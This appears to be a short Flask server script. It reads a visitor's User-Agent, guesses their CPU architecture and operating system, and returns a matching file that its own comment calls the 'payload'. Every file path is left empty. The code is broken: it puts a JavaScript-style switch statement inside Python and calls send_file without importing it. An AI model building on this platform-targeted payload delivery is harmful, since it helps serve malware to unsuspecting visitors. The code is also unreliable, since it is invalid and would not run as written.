from flask import Flask 
from flask import request

#declare flask object and route index page
app = Flask(__name__)
@app.route('/')
def index():

    #get the user agent of the client
    user_agent = request.headers.get('User-Agent')

    #variables for architecture test     
    x64_test = "x86_64"
    architectures = ["x64","x86"]
    architecture = ""

    #architecture test against user agent
    if x64_test in user_agent:
        architecture = architectures[0]
    else:
        architecture = architectures[1]

    #variables for operating systems test
    android_test = "Android"
    linux_test = "Linux"
    window_test = "Windows"
    operating_systems = ["android","linux","windows"]
    operating_system = ""

    #operating system test against user agent
    if linux_test in user_agent:
        operating_system = operating_systems[1]
        if android_test in user_agent:
            operating_system = operating_systems[0]
    else:
        operating_system = operating_systems[2]

    #concatenated pattern for switch
    arch_os_pattern = architecture + " " + operating_system

    #set filepath with switch string pattern
    switch(arch_os_pattern) {
        case "x64 linux" : filepath = ""
            break
        case "x64 windows" : filepath = ""
            break
        case "x64 android": filepath = ""
            break
        case "x86 linux" : filepath = ""
            break
        case "x86 windows" : filepath = ""
            break
        case "x86 android" : filepath = ""
            break
        default:    filepath = ""
            break
    }   

    #send set payload
    return send_file(filepath)